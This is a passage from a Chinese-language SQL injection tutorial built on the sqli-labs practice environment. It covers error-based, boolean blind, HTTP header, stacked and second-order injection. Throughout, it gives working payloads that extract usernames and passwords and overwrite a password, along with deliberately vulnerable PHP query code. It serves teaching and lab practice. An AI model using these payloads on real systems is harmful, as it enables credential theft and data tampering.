alt="img"></p><p>如果要看第二行则，limit1,1（第一行的往下一行，不包括第一行，即显示第二行），看第三行则limit2,1。以这个方法获取第四个表为users</p><ol start="3"><li>爆表中的字段</li></ol><blockquote><p>?id=1’ and updatexml(1,concat(‘^’,(select column_name from information_schema.columns where table_name=’users’ and table_schema=’security’ limit 0,1 ),’^’),1) –+</p></blockquote><p><img src="https://img-blog.csdnimg.cn/20210316095511672.png" alt="img"></p><p>总共爆出的字段为： id , username , password</p><ol start="4"><li>爆字段中的内容</li></ol><blockquote><p>?id=1’ and updatexml(1,concat(‘^’,(select group_concat(username,”–”,password) from users limit 0,1 ),’^’),1) –+</p></blockquote><p>三组用户名和密码。</p><p><img src="https://img-blog.csdnimg.cn/20210316095719686.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ0MTU5MDI4,size_16,color_FFFFFF,t_70" alt="img"></p><h3 id="3、基于布尔的盲注"><a href="#3、基于布尔的盲注" class="headerlink" title="3、基于布尔的盲注"></a>3、基于布尔的盲注</h3><p>布尔盲注，即在页面没有错误回显时完成的注入攻击。此时我们输入的语句让页面呈现出两种状态，相当于true和false，根据这两种状态可以判断我们输入的语句是否查询成功。以less-8关为例</p><ol><li>我们输入正确的id，显示You are in …..</li></ol><p><img src="https://img-blog.csdnimg.cn/2021031617333684.png" alt="img"></p><p>我们输入错误的语句如id=1’ ，或者id=-1时，就什么都不显示。这就是布尔盲注，屏幕上能得到信息不多，就是两种状态</p><p><img src="https://img-blog.csdnimg.cn/20210316173450459.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ0MTU5MDI4,size_16,color_FFFFFF,t_70" alt="img"></p><p>源码如下</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs sql">$<span class="hljs-keyword">sql</span><span class="hljs-operator">=</span>&quot;SELECT * FROM users WHERE id=&#x27;$id&#x27; LIMIT 0,1 &quot;;<br>$<span class="hljs-keyword">result</span><span class="hljs-operator">=</span>mysql_query($<span class="hljs-keyword">sql</span>);<br>$<span class="hljs-type">row</span> <span class="hljs-operator">=</span> mysql_fetch_array($<span class="hljs-keyword">result</span>);<br> <br>if($<span class="hljs-type">row</span>)<br>&#123;<br>  echo <span class="hljs-string">&#x27;&lt;font size=&quot;5&quot; color=&quot;#FFFF00&quot;&gt;&#x27;</span>;<br>  echo <span class="hljs-string">&#x27;You are in...........&#x27;</span>;<br>  echo &quot;&lt;br&gt;&quot;;<br>    echo &quot;&lt;/font&gt;&quot;;<br>  &#125;<br><span class="hljs-keyword">else</span> <br>&#123;<br>    echo <span class="hljs-string">&#x27;&lt;font size=&quot;5&quot; color=&quot;#FFFF00&quot;&gt;&#x27;</span>;<br>    ｝<br></code></pre></td></tr></table></figure><p>所以，我们构造判断语句，根据页面是否回显证实猜想。一般用到的函数ascii() 、substr() 、length()，exists()、concat()等。</p><p><img src="https://img-blog.csdnimg.cn/20210316182126690.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ0MTU5MDI4,size_16,color_FFFFFF,t_70" alt="img"></p><ol><li>判断数据库类型</li></ol><ul><li>MySQL数据库表   information_schema.tables</li><li>access           msysobjects </li><li>SQLServer        sysobjects</li></ul><p>用下的语句判断数据库。哪个页面正常显示，就属于哪个数据库</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-operator">/</span><span class="hljs-operator">/</span>判断是否是 Mysql数据库<br>http:<span class="hljs-operator">/</span><span class="hljs-operator">/</span><span class="hljs-number">127.0</span><span class="hljs-number">.0</span><span class="hljs-number">.1</span><span class="hljs-operator">/</span>sqli<span class="hljs-operator">/</span>Less<span class="hljs-number">-5</span><span class="hljs-operator">/</span>?id<span class="hljs-operator">=</span><span class="hljs-number">1</span><span class="hljs-string">&#x27; and exists(select*from information_schema.tables) --+</span><br><span class="hljs-string">//判断是否是 access数据库</span><br><span class="hljs-string">http://127.0.0.1/sqli/Less-5/?id=1&#x27;</span> <span class="hljs-keyword">and</span> <span class="hljs-keyword">exists</span>(<span class="hljs-keyword">select</span><span class="hljs-operator">*</span><span class="hljs-keyword">from</span> msysobjects) <span class="hljs-comment">--+</span><br><span class="hljs-operator">/</span><span class="hljs-operator">/</span>判断是否是 Sqlserver数据库<br>http:<span class="hljs-operator">/</span><span class="hljs-operator">/</span><span class="hljs-number">127.0</span><span class="hljs-number">.0</span><span class="hljs-number">.1</span><span class="hljs-operator">/</span>sqli<span class="hljs-operator">/</span>Less<span class="hljs-number">-5</span><span class="hljs-operator">/</span>?id<span class="hljs-operator">=</span><span class="hljs-number">1</span><span class="hljs-string">&#x27; and exists(select*from sysobjects) --+</span><br></code></pre></td></tr></table></figure><p><img src="https://img-blog.csdnimg.cn/20210316174105779.png" alt="img"></p><p><img src="https://img-blog.csdnimg.cn/20210316174130279.png" alt="img"></p><p>所以当前数据库为mysql数据库</p><ol start="2"><li>判断当前数据库名</li></ol><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs bash"><br>1：判断当前数据库的长度，利用二分法<br>http://127.0.0.1/sqli/Less-5/?<span class="hljs-built_in">id</span>=1<span class="hljs-string">&#x27; and length(database())&gt;5 --+  //正常显示</span><br><span class="hljs-string">http://127.0.0.1/sqli/Less-5/?id=1&#x27;</span> and length(database())&gt;10 --+  //不显示任何数据<br>http://127.0.0.1/sqli/Less-5/?<span class="hljs-built_in">id</span>=1<span class="hljs-string">&#x27; and length(database())&gt;7 --+  //正常显示</span><br><span class="hljs-string">http://127.0.0.1/sqli/Less-5/?id=1&#x27;</span> and length(database())&gt;8 --+  //不显示任何数据<br> <br>  大于7正常显示，大于8不显示，说明大于7而不大于8，所以可知当前数据库长度为8个字符<br> <br>2：判断当前数据库的字符,和上面的方法一样，利用二分法依次判断<br>//判断数据库的第一个字符<br>http://127.0.0.1/sqli/Less-5/?<span class="hljs-built_in">id</span>=1<span class="hljs-string">&#x27; and ascii(substr(database(),1,1))&gt;115 --+ //100为ascii表中的十进制，对应字母s</span><br><span class="hljs-string">//判断数据库的第二个字符</span><br><span class="hljs-string">http://127.0.0.1/sqli/Less-5/?id=1&#x27;</span> and ascii(substr(database(),2,1))&gt;100 --+<br>//判断数据库的第三个字符<br>http://127.0.0.1/sqli/Less-5/?<span class="hljs-built_in">id</span>=1<span class="hljs-string">&#x27; and ascii(substr(database(),3,1))&gt;100 --+</span><br><span class="hljs-string">...........</span><br><span class="hljs-string">由此可以判断出当前数据库为 security</span><br></code></pre></td></tr></table></figure><ol start="3"><li>判断当前库的表名</li></ol><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-operator">/</span><span class="hljs-operator">/</span>猜测当前数据库中是否存在admin表<br>http:<span class="hljs-operator">/</span><span class="hljs-operator">/</span><span class="hljs-number">127.0</span><span class="hljs-number">.0</span><span class="hljs-number">.1</span><span class="hljs-operator">/</span>sqli<span class="hljs-operator">/</span>Less<span class="hljs-number">-5</span><span class="hljs-operator">/</span>?id<span class="hljs-operator">=</span><span class="hljs-number">1</span><span class="hljs-string">&#x27; and exists(select*from admin) --+</span><br><span class="hljs-string">1：判断当前数据库中表的个数</span><br><span class="hljs-string">// 判断当前数据库中的表的个数是否大于5，用二分法依次判断，最后得知当前数据库表的个数为4</span><br><span class="hljs-string">http://127.0.0.1/sqli/Less-5/?id=1&#x27;</span> <span class="hljs-keyword">and</span> (<span class="hljs-keyword">select</span> <span class="hljs-built_in">count</span>(table_name) <span class="hljs-keyword">from</span> information_schema.tables <span class="hljs-keyword">where</span> table_schema<span class="hljs-operator">=</span>database())<span class="hljs-operator">&gt;</span><span class="hljs-number">3</span> <span class="hljs-comment">--+</span><br> <br><span class="hljs-number">2</span>：判断每个表的长度<br><span class="hljs-operator">/</span><span class="hljs-operator">/</span>判断第一个表的长度，用二分法依次判断，最后可知当前数据库中第一个表的长度为<span class="hljs-number">6</span><br>http:<span class="hljs-operator">/</span><span class="hljs-operator">/</span><span class="hljs-number">127.0</span><span class="hljs-number">.0</span><span class="hljs-number">.1</span><span class="hljs-operator">/</span>sqli<span class="hljs-operator">/</span>Less<span class="hljs-number">-5</span><span class="hljs-operator">/</span>?id<span class="hljs-operator">=</span><span class="hljs-number">1</span><span class="hljs-string">&#x27; and length((select table_name from information_schema.tables where table_schema=database() limit 0,1))&gt;6 --+</span><br><span class="hljs-string">//判断第二个表的长度，用二分法依次判断，最后可知当前数据库中第二个表的长度为6</span><br><span class="hljs-string">http://127.0.0.1/sqli/Less-5/?id=1&#x27;</span> <span class="hljs-keyword">and</span> length((<span class="hljs-keyword">select</span> table_name <span class="hljs-keyword">from</span> information_schema.tables <span class="hljs-keyword">where</span> table_schema<span class="hljs-operator">=</span>database() limit <span class="hljs-number">1</span>,<span class="hljs-number">1</span>))<span class="hljs-operator">=</span><span class="hljs-number">6</span> <span class="hljs-comment">--+</span><br> <br><span class="hljs-number">3</span>：判断每个表的每个字符的ascii值<br><span class="hljs-operator">/</span><span class="hljs-operator">/</span>判断第一个表的第一个字符的ascii值<br>http:<span class="hljs-operator">/</span><span class="hljs-operator">/</span><span class="hljs-number">127.0</span><span class="hljs-number">.0</span><span class="hljs-number">.1</span><span class="hljs-operator">/</span>sqli<span class="hljs-operator">/</span>Less<span class="hljs-number">-5</span><span class="hljs-operator">/</span>?id<span class="hljs-operator">=</span><span class="hljs-number">1</span><span class="hljs-string">&#x27; and ascii(substr((select table_name from information_schema.tables where table_schema=database() limit 0,1),1,1))&gt;100 --+</span><br><span class="hljs-string">//判断第一个表的第二个字符的ascii值               </span><br><span class="hljs-string">http://127.0.0.1/sqli/Less-5/?id=1&#x27;</span> <span class="hljs-keyword">and</span> ascii(substr((<span class="hljs-keyword">select</span> table_name <span class="hljs-keyword">from</span> information_schema.tables <span class="hljs-keyword">where</span> table_schema<span class="hljs-operator">=</span>database() limit <span class="hljs-number">0</span>,<span class="hljs-number">1</span>),<span class="hljs-number">2</span>,<span class="hljs-number">1</span>))<span class="hljs-operator">&gt;</span><span class="hljs-number">100</span> <span class="hljs-comment">--+</span><br>.........<br>由此可判断出存在表 emails、referers、uagents、users ，猜测users表中最有可能存在账户和密码，所以以下判断字段和数据在 users 表中判断<br></code></pre></td></tr></table></figure><ol start="4"><li>判断表的字段</li></ol><ul><li>判断字段个数</li><li>判断每个字段的长度</li><li>猜每个字段的字符</li></ul><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-operator">/</span><span class="hljs-operator">/</span>如果已经证实了存在admin表，那么猜测是否存在username字段<br>http:<span class="hljs-operator">/</span><span class="hljs-operator">/</span><span class="hljs-number">127.0</span><span class="hljs-number">.0</span><span class="hljs-number">.1</span><span class="hljs-operator">/</span>sqli<span class="hljs-operator">/</span>Less<span class="hljs-number">-5</span><span class="hljs-operator">/</span>?id<span class="hljs-operator">=</span><span class="hljs-number">1</span><span class="hljs-string">&#x27; and exists(select username from admin) </span><br><span class="hljs-string">1：判断表中字段的个数</span><br><span class="hljs-string">//判断users表中字段个数是否大于5</span><br><span class="hljs-string">http://127.0.0.1/sqli/Less-5/?id=1&#x27;</span> <span class="hljs-keyword">and</span> (<span class="hljs-keyword">select</span> <span class="hljs-built_in">count</span>(column_name) <span class="hljs-keyword">from</span> information_schema.columns <span class="hljs-keyword">where</span> table_name<span class="hljs-operator">=</span><span class="hljs-string">&#x27;users&#x27;</span> <span class="hljs-keyword">and</span> table_schema<span class="hljs-operator">=</span><span class="hljs-string">&#x27;security&#x27;</span>)<span class="hljs-operator">&gt;</span><span class="hljs-number">5</span> <span class="hljs-comment">--+</span><br><span class="hljs-number">2</span>：判断每个字段的长度<br><span class="hljs-operator">/</span><span class="hljs-operator">/</span>判断第一个字段的长度<br>http:<span class="hljs-operator">/</span><span class="hljs-operator">/</span><span class="hljs-number">127.0</span><span class="hljs-number">.0</span><span class="hljs-number">.1</span><span class="hljs-operator">/</span>sqli<span class="hljs-operator">/</span>Less<span class="hljs-number">-5</span><span class="hljs-operator">/</span>?id<span class="hljs-operator">=</span><span class="hljs-number">1</span><span class="hljs-string">&#x27; and length((select column_name from information_schema.columns where table_name=&#x27;</span>users<span class="hljs-string">&#x27; limit 0,1))&gt;5 --+</span><br><span class="hljs-string">//判断第二个字段的长度   </span><br><span class="hljs-string">http://127.0.0.1/sqli/Less-5/?id=1&#x27;</span> <span class="hljs-keyword">and</span> length((<span class="hljs-keyword">select</span> column_name <span class="hljs-keyword">from</span> information_schema.columns <span class="hljs-keyword">where</span> table_name<span class="hljs-operator">=</span><span class="hljs-string">&#x27;users&#x27;</span> limit <span class="hljs-number">1</span>,<span class="hljs-number">1</span>))<span class="hljs-operator">&gt;</span><span class="hljs-number">5</span> <span class="hljs-comment">--+</span><br><span class="hljs-number">3</span>：判断每个字段名字的ascii值<br><span class="hljs-operator">/</span><span class="hljs-operator">/</span>判断第一个字段的第一个字符的ascii<br>http:<span class="hljs-operator">/</span><span class="hljs-operator">/</span><span class="hljs-number">127.0</span><span class="hljs-number">.0</span><span class="hljs-number">.1</span><span class="hljs-operator">/</span>sqli<span class="hljs-operator">/</span>Less<span class="hljs-number">-5</span><span class="hljs-operator">/</span>?id<span class="hljs-operator">=</span><span class="hljs-number">1</span><span class="hljs-string">&#x27; and ascii(substr((select column_name from information_schema.columns where table_name=&#x27;</span>users<span class="hljs-string">&#x27; limit 0,1),1,1))&gt;100 --+</span><br><span class="hljs-string">//判断第一个字段的第二个字符的ascii</span><br><span class="hljs-string">http://127.0.0.1/sqli/Less-5/?id=1&#x27;</span> <span class="hljs-keyword">and</span> ascii(substr((<span class="hljs-keyword">select</span> column_name <span class="hljs-keyword">from</span> information_schema.columns <span class="hljs-keyword">where</span> table_name<span class="hljs-operator">=</span><span class="hljs-string">&#x27;users&#x27;</span> limit <span class="hljs-number">0</span>,<span class="hljs-number">1</span>),<span class="hljs-number">2</span>,<span class="hljs-number">1</span>))<span class="hljs-operator">&gt;</span><span class="hljs-number">100</span> <span class="hljs-comment">--+</span><br>...........<br>由此可判断出users表中存在 id、username、password 字段<br></code></pre></td></tr></table></figure><ol start="5"><li>爆字段中的数据</li></ol><ul><li>猜字段中数据的长度</li><li>猜字段数据的每个字符ascii码 得字符</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs cobol">我们知道了users中有三个字段 id 、username 、password，我们现在爆出每个字段的数据<br> <br>1: 判断数据的长度<br>// 判断id字段的第一个数据的长度<br>http://127.0.0.1/sqli/Less-5/?id=1&#x27; and length((select id from users limit 0,1))&gt;5 --+<br>// 判断id字段的第二个数据的长度<br>http://127.0.0.1/sqli/Less-5/?id=1&#x27; and length((select id from users limit 1,1))&gt;5 --+<br> <br>2：判断数据的ascii值<br>// 判断id字段的第一行数据的第一个字符的ascii值<br>http://127.0.0.1/sqli/Less-5/?id=1&#x27; and ascii(substr((select id from users limit  0,1),1,1))&gt;100 --+<br>// 判断id字段的第二行数据的第二个字符的ascii值<br>http://127.0.0.1/sqli/Less-5/?id=1&#x27; and ascii(substr((select id from users limit 0,1),2,1))&gt;100 --+<br>...........<br></code></pre></td></tr></table></figure><p>一般布尔盲注，手工去注入过于繁琐，不建议手工注入，可以借助于工具。</p><h3 id="4、HTTP头注入"><a href="#4、HTTP头注入" class="headerlink" title="4、HTTP头注入"></a>4、HTTP头注入</h3><p>常见的sql注入一般是通过请求参数或者表单进行注入，而HTTP头部注入是通过HTTP协议头部字段值进行注入。http头注入常存在于以下地方</p><p><img src="https://img-blog.csdnimg.cn/20210323100756615.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ0MTU5MDI4,size_16,color_FFFFFF,t_70" alt="img"></p><p><strong>产生注入的条件</strong>：</p><p>- 能够对请求头消息进行修改</p><p>- 修改的请求头信息能够带入数据库进行查询</p><p>- 数据库没有对输入的请求信息做过滤</p><p><strong>1. User-Agent注入</strong></p><p>​    User-Agent：使得服务器能够识别客户使用的操作系统，浏览器版本等。（很多数据量大的网站中会记录客户使用的操作系统或浏览器版本等然后将其存入数据库中）。这里获取User-Agent就可以知道客户都是通过什么浏览器访问系统的，然后将其值保存到数据库中。</p><p>以sqli-labs less-18关为例，登录用户密码：dumb ,0</p><p>1.1 判断注入点：user-agent值后面加上’，引发报错，确定存在sql注入</p><p><img src="https://img-blog.csdnimg.cn/20210323101045836.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ0MTU5MDI4,size_16,color_FFFFFF,t_70" alt="img"></p><p>1.2 采用报错注入函数获取当前数据库名</p><figure class="highlight csharp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs csharp"><span class="hljs-string">&#x27; and updatexml(1,concat(&#x27;</span>^<span class="hljs-string">&#x27;,(database()),&#x27;</span>^<span class="hljs-string">&#x27;),1) and &#x27;</span><br></code></pre></td></tr></table></figure><p><img src="https://img-blog.csdnimg.cn/20210323101137486.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ0MTU5MDI4,size_16,color_FFFFFF,t_70" alt="img"></p><p><strong>2. cookie注入</strong></p><p>​    cookie：服务器端用来记录客户端的状态。由服务端产生，保存在浏览器中。传送门-》<a href="https://blog.csdn.net/qq_44159028/article/details/114359205?ops_request_misc=%7B%22request_id%22:%22161646553116780266210214%22,%22scm%22:%2220140713.130102334.pc_blog.%22%7D&request_id=161646553116780266210214&biz_id=0&utm_medium=distribute.pc_search_result.none-task-blog-2~blog~first_rank_v1~rank_blog_v1-1-114359205.pc_v1_rank_blog_v1&utm_term=cookie">cookie</a> 。以sqli-labs less-20关为例，登录后</p><p><img src="https://img-blog.csdnimg.cn/20210323101350105.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ0MTU5MDI4,size_16,color_FFFFFF,t_70" alt="img"></p><p>2.1 首先判断注入点，加 ‘ 单引号报错</p><p><img src="https://img-blog.csdnimg.cn/20210323101417342.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ0MTU5MDI4,size_16,color_FFFFFF,t_70" alt="img"></p><p>2.2 采用报错注入函数获取当前数据库名</p><figure class="highlight csharp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs csharp"><span class="hljs-string">&#x27; and updatexml(1,concat(&#x27;</span>^<span class="hljs-string">&#x27;,(database()),&#x27;</span>^<span class="hljs-string">&#x27;),1) and &#x27;</span><br></code></pre></td></tr></table></figure><p><strong>3. Referer注入</strong></p><p>​    <strong>Referer：</strong>是HTTP header的一部分，当浏览器向web服务器发送请求的时候，一般会带上Referer，告诉服务器该网页是从哪个页面链接过来的，服务器因此可以获得一些信息用于处理。</p><ol><li><p>判断输入点，加单引号引发报错</p></li><li><p>使用报错注入函数：</p></li></ol><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs cobol">‘ and updatexml(1,concat(0x7e,(database()),0x7e),0) and &#x27;<br></code></pre></td></tr></table></figure><p><img src="https://img-blog.csdnimg.cn/20210323101809562.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ0MTU5MDI4,size_16,color_FFFFFF,t_70" alt="img"></p><p>方法都是一样的。</p><p><strong>4. X-Forwarded-For 注入</strong></p><p>X-Forwarded-For(XFF)：用来识别客户端最原始的ip地址。详见，传送门：<a href="https://blog.csdn.net/qq_44159028/article/details/112528864?ops_request_misc=%7B%22request_id%22:%22161646592716780261962393%22,%22scm%22:%2220140713.130102334.pc_blog.%22%7D&request_id=161646592716780261962393&biz_id=0&utm_medium=distribute.pc_search_result.none-task-blog-2~blog~first_rank_v1~rank_blog_v1-1-112528864.pc_v1_rank_blog_v1&utm_term=X-for">X-Forwarded-For sql注入</a></p><h3 id="5、堆叠查询"><a href="#5、堆叠查询" class="headerlink" title="5、堆叠查询"></a>5、堆叠查询</h3><p>堆叠查询也叫堆叠注入，在SQL中，分号（;）是用来表示一条sql语句的结束。试想一下我们在 ; 结束一个sql语句后继续构造下一条语句，会不会一起执行？因此这个想法也就造就了堆叠注入。而union injection（联合注入）也是将两条语句合并在一起，两者之间有什么区别么？区别就在于union 或者union all执行的语句类型是有限的，可以用来执行查询语句，而堆叠注入可以执行的是任意的语句。以sqli-labs第38关为例</p><p><img src="https://img-blog.csdnimg.cn/20210325120628613.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ0MTU5MDI4,size_16,color_FFFFFF,t_70" alt="img"></p><p>执行</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs cobol">id=1&#x27;;update users set password=&#x27;123456&#x27; where id=1; --+ <br></code></pre></td></tr></table></figure><p>意思就是再更新id=1的用户密码为123456。如下成功执行了更新密码的语句</p><p><img src="https://img-blog.csdnimg.cn/20210325120909611.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ0MTU5MDI4,size_16,color_FFFFFF,t_70" alt="img"></p><p><strong>堆叠查询的局限性</strong></p><p>堆叠注入的局限性在于并不是每一个环境下都可以执行，可能受到API或者数据库引擎不支持的限制，当然了权限不足也可以解释为什么攻击者无法修改数据或者调用一些程序。虽然我们前面提到了堆叠查询可以执行任意的sql语句，但是这种注入方式并不是十分的完美的。在我们的web系统中，因为代码通常只返回一个查询结果，因此，堆叠注入第二个语句产生错误或者结果只能被忽略，我们在前端界面是无法看到返回结果的。如上面的实例如果我们不输出密码那我们是看不到这个结果的。因此，在读取数据时，我们建议使用union（联合）注入。同时在使用堆叠注入之前，我们也是需要知道一些数据库相关信息的，例如表名，列名等信息</p><h3 id="6、二阶注入"><a href="#6、二阶注入" class="headerlink" title="6、二阶注入"></a>6、二阶注入</h3><p>二次注入漏洞是一种在Web应用程序中广泛存在的安全漏洞形式。相对于一次注入漏洞而言，二次注入漏洞更难以被发现，但是它却具有与—次注入攻击漏洞相同的攻击威力。</p><ol><li>黑客通过构造数据的形式，在浏览器或者其他软件中提交HTTP数据报文请求到服务端进行处理，提交的数据报文请求中可能包含了黑客构造的SQL语句或者命令。</li><li>服务端应用程序会将黑客提交的数据信息进行存储，通常是保存在数据库中，保存的数据信息的主要作用是为应用程序执行其他功能提供原始输入数据并对客户端请求做出响应。</li><li>黑客向服务端发送第二个与第一次不相同的请求数据信息。</li><li>服务端接收到黑客提交的第二个请求信息后，为了处理该请求，服务端会查询数据库中已经存储的数据信息并处理，从而导致黑客在第一次请求中构造的SQL语句或者命令在服务端环境中执行。</li><li>服务端返回执行的处理结果数据信息，黑客可以通过返回的结果数据信息判断二次注入漏洞利用是否成功</li></ol><p>总结，二次注入就是由于将数据存储进数据库中时未做好过滤，先提交构造好的特殊字符请求存储进数据库，然后提交第二次请求时与第一次提交进数据库中的字符发生了作用，形成了一条新的sql语句导致被执行。以sqli-labs第24关为例</p><p><strong>sqli-labs less-24</strong></p><ol><li>如下点击注册用户</li></ol><p><img src="https://img-blog.csdnimg.cn/20210325171938838.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ0MTU5MDI4,size_16,color_FFFFFF,t_70" alt="img"></p><p>这里注册用户名为 admin’#</p><p><img src="https://img-blog.csdnimg.cn/2021032517204294.png" alt="img"></p><p>此时我们查看数据库，注册的用户已经存储进去了，并且admin的密码是DDD</p><p><img src="https://img-blog.csdnimg.cn/20210325172142765.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ0MTU5MDI4,size_16,color_FFFFFF,t_70" alt="img"></p><ol start="2"><li>对注册的账号进行登录然后修改密码为ccccc</li></ol><p><img src="https://img-blog.csdnimg.cn/20210325172253439.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ0MTU5MDI4,size_16,color_FFFFFF,t_70" alt="img"></p><p>此时提示密码已经成功修改了</p><p><img src="https://img-blog.csdnimg.cn/20210325172320556.png" alt="img"></p><p>此时我们发现反倒是admin的密码被修改成了ccccc，而我们注册的用户admin’#的密码并没有被修改</p><p><img src="https://img-blog.csdnimg.cn/20210325172540390.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ0MTU5MDI4,size_16,color_FFFFFF,t_70" alt="img"></p><p><strong>漏洞原因</strong></p><ol><li><p>在进行用户注册的允许存在’和#这种特殊字符</p></li><li><p>在修改密码页面的源码中，发现这里很明显存在注入漏洞</p></li></ol><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql">$<span class="hljs-keyword">sql</span> <span class="hljs-operator">=</span> &quot;UPDATE users SET PASSWORD=&#x27;$pass&#x27; where username=&#x27;$username&#x27; and password=&#x27;$curr_pass&#x27; &quot;;<br></code></pre></td></tr></table></figure><p>当我们登录账号admin’#并修改密码时，这条sql语句就变成了如下这个样子，#把后面的代码都注释掉了，所以修改了用户admin的密码为ccccc</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql">$<span class="hljs-keyword">sql</span> <span class="hljs-operator">=</span> &quot;UPDATE users SET PASSWORD=&#x27;$pass&#x27; where username=&#x27;admin&#x27;#&#x27; and password=&#x27;$curr_pass&#x27; &quot;;<br></code></pre></td></tr></table></figure><h3 id="7、宽字节注入"><a href="#7、宽字节注入" class="headerlink" title="7、宽字节注入"></a>7、宽字节注入</h3><p><strong>宽字节案例引入</strong>    </p><p>宽字节注入准确来说不是注入手法，而是另外一种比较特殊的情况。为了说明宽字节注入问题，我们以SQLi-labs 32 关为例子。 使用?id=1’ 进行测试的时候，发现提交的单引号会被转义[&#39;]。此时，转义后的单引号会被作为普通字符带入数据库查询。也就是说，我们提交的单引号不会影响到原来SQL 语句的结构。</p><p><img src="https://img-blog.csdnimg.cn/20210324174905605.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ0MTU5MDI4,size_16,color_FFFFFF,t_70" alt="img"></p><p>接着我们查看这关的源码，发现传入的id经过addslashes转移函数的处理，所有的单引号双引号字符都会被添加转义字符。接着在带入到数据库查询前设置了mysql_query(“SET NAMES 